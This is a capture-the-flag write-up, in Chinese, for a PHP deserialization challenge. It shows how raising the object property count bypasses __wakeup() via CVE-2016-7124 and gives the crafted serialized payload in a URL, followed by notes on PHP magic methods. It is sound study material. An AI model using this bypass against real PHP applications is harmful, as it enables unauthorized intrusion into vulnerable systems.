本题为代码审计
题目：

class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=

首先进行代码审计，
（1）可以看到xctf类只拥有一个public的flag变量，值为111。
（2）public属性序列化后格式为：数据类型:属性名长度:"属性名";数据类型:属性值长度:"属性值"。
（3）本题目中，只存在一个变量，正常情况下序列化后，如下所示。
	O:4:"xctf":1:{s:4:"flag";s:3:"111";}
（4）将设置属性值为2，可导致反序列化异常，如下所示。
	O:4:"xctf":2:{s:4:"flag";s:3:"111";}


有漏洞（CVE-2016-7124）可以通过**使序列化字符串中表示对象属性个数的值大于真实的属性个数，以此跳过__wakeup的执行**，
而PHP5 < 5.6.25， PHP7 < 7.0.10 的版本存在wakeup的漏洞。


然后根据Web_php_unserialize这道题的解法，写出代码：
<?php
class xctf{                      //定义一个名为xctf的类
public $flag = '111';            //定义一个公有的类属性$flag，值为111
public function __wakeup(){      //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本
exit('bad requests');
}
}
$test = new xctf();           //使用new运算符来实例化该类（xctf）的对象为test
echo(serialize($test));       //输出被序列化的对象（test）
?>

得到结果：O:4:"xctf":1:{s:4:"flag";s:3:"111";}
为绕过wakeup函数，需要使得序列化字符串中标识变量数量的值大于实际变量即可绕过,为此需要将1变为2：
O:4:"xctf":2:{s:4:"flag";s:3:"111";}
根据代码中的?code= 可得知，将得到的序列化字符串赋值给code进行传递
最后需要给url传参，结果为：
http://220.249.52.133:34129?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}

writeup2:
深度剖析PHP序列化与反序列化：https://www.cnblogs.com/youyoui/p/8610068.html
__wakeup()函数用法:

wakeup()是用在反序列化操作中。unserialize()会检查存在一个wakeup()方法。如果存在，则先会调用__wakeup()方法。

该writeup浅显易懂，值得再看一遍

writeup3：
serialize()     //将一个对象转换成一个字符串
unserialize()   //将字符串还原成一个对象

通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。

在利用对PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。

常见方法

__construct()//创建对象时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__invoke() //当脚本尝试将对象调用为函数时触发

比较重要的方法
__sleep()

    serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。

对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。
__wakeup()

    unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。

